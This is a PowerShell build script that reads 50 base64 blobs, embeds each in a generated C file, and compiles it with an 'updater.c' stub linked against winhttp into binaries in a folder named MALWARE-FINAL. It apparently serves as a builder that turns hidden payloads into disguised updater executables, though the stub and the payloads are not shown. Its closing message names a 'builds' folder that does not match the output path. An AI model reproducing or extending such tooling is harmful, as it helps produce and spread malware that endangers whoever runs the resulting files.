New-Item -ItemType Directory -Force -Path MALWARE-FINAL | Out-Null
New-Item -ItemType Directory -Force -Path tmp | Out-Null

for ($i = 1; $i -le 50; $i++) {
    $txtFile = "padded-b64\$i.txt.bin"
    $outFile = "MALWARE-FINAL\$i.dat"
    $fooSrc  = "tmp\foo_$i.c"

    # Read base64 text and remove line breaks
    $b64 = (Get-Content $txtFile -Raw) -replace "`r?`n",""

    # Write a small C file defining foo
@"
const char *foo = "$b64";
"@ | Out-File -Encoding UTF8 $fooSrc

    Write-Host "Building $outFile ..."
    gcc -static -static-libgcc updater.c $fooSrc -o $outFile -lwinhttp
}

Write-Host "✅ All builds done. Binaries are in 'builds' folder."
